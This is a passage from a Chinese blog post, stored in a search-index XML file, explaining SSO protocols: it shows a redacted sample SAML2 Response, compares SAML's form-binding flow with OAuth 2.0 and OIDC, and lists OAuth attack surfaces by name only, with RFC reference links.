class="name">ds:DigestMethod</span> <span class="attr">Algorithm</span>=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:DigestValue</span>&gt;</span>/xxxxxxxx<span class="tag">&lt;/<span class="name">ds:DigestValue</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ds:Reference</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">ds:SignedInfo</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ds:SignatureValue</span>&gt;</span>xxxxx<span class="tag">&lt;/<span class="name">ds:SignatureValue</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ds:KeyInfo</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">ds:X509Data</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">ds:X509Certificate</span>&gt;</span>xxxxxx<span class="tag">&lt;/<span class="name">ds:X509Certificate</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">ds:X509Data</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">ds:KeyInfo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ds:Signature</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:Subject</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:NameID</span> <span class="attr">Format</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&quot;</span>&gt;</span>test@test.example.com<span class="tag">&lt;/<span class="name">saml:NameID</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:SubjectConfirmation</span> <span class="attr">Method</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:SubjectConfirmationData</span> <span class="attr">NotOnOrAfter</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">Recipient</span>=<span class="string">&quot;https://xxx.xxx.com/saml/SSO&quot;</span> <span class="attr">InResponseTo</span>=<span class="string">&quot;xxxxx&quot;</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:SubjectConfirmation</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:Subject</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:Conditions</span> <span class="attr">NotBefore</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">NotOnOrAfter</span>=<span class="string">&quot;xxxx&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:AudienceRestriction</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:Audience</span>&gt;</span>https://xxx.xxx.com/xxxxxx/saml/SSO<span class="tag">&lt;/<span class="name">saml:Audience</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:AudienceRestriction</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:Conditions</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:AuthnStatement</span> <span class="attr">AuthnInstant</span>=<span class="string">&quot;xxxx&quot;</span> <span class="attr">SessionIndex</span>=<span class="string">&quot;xxxxx&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:AuthnContext</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:AuthnContextClassRef</span>&gt;</span>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified<span class="tag">&lt;/<span class="name">saml:AuthnContextClassRef</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:AuthnContext</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:AuthnStatement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">saml:AttributeStatement</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span>xxxx@xxxx.cn</span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:AttributeValue</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">					<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span>xxxx@xxx.xx</span><br><span class="line">					<span class="tag">&lt;/<span class="name">saml:AttributeValue</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">saml:Attribute</span> <span class="attr">Name</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">NameFormat</span>=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">saml:AttributeValue</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">						<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:type</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span>null</span><br><span class="line">					<span class="tag">&lt;/<span class="name">saml:AttributeValue</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">saml:Attribute</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">saml:AttributeStatement</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">saml:Assertion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">samlp:Response</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到，整体流程上和OAuth 2.0隐式模式并无太大差异，除了SAML2使用了断言这一数据结构来传输用户数据外，另一处差别便是在此模式下SAML的SP与IDP是不会直接进行通信的，而在OAuth 2.0以及OIDC中，Clients均会向授权服务器的token或者userinfo等端点访问以获取用户信息、Token等资料，导致该差别的原因只在于使用了form-bind的方式进行交互，若使用artifact-bind的方式便与授权码模式无异。</p>
<p>SAML不仅可以被单独用户SSO，其也可以嵌入到其他协议中作为一种数据结构来进行安全信息交换，如在OAuth2.0中通过Code 去获取Access Token时便可采用SAML的方式交换数据 <a href="https://www.rfc-editor.org/rfc/rfc7522#/">RFC7522</a>。</p>
<h1 id="常见攻击面"><a href="#常见攻击面" class="headerlink" title="常见攻击面"></a>常见攻击面</h1><p>OAuth2.0规范中提及了以下的攻击手法：</p>
<ul>
<li>凭据猜测攻击</li>
<li>钓鱼攻击</li>
<li>跨站请求伪造</li>
<li>点击劫持</li>
<li>代码注入</li>
<li>访问令牌滥用：隐式流+公共客户端</li>
<li>开放重定向</li>
</ul>
<p>除了规范中提及的攻击手法，实践中因为规范的实现差异以及一些其他的技术问题OAuth在以下方面也存在薄弱面</p>
<ul>
<li>Access Token验证失败</li>
<li>开放客户端注册</li>
<li>客户端认证缺失</li>
<li>凭据泄露</li>
<li>.well-known接口过度信息泄露</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://datatracker.ietf.org/doc/html/rfc6749#/">RFC6749</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc7522#/">RFC7522</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc7521#/">RFC7521</a></li>
<li><a href="https://openid.net/specs/openid-connect-core-1_0.html#/">OpenID Connect Core 1.0 incorporating errata set 2</a></li>
<li><a href="https://docs.authing.co/v2/concepts/">https://docs.authing.co/v2/concepts/</a></li>
<li><a href="https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html#/">https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0.html#/</a></li>
</ul>
]]></content>
      <categories>
        <category>安全技术</category>
      </categories>
      <tags>
        <tag>单点登录</tag>
        <tag>SSO</tag>
        <tag>OAuth</tag>
        <tag>CAS</tag>
        <tag>OIDC</tag>
        <tag>SAML2</tag>
      </tags>
  </entry>
</search>
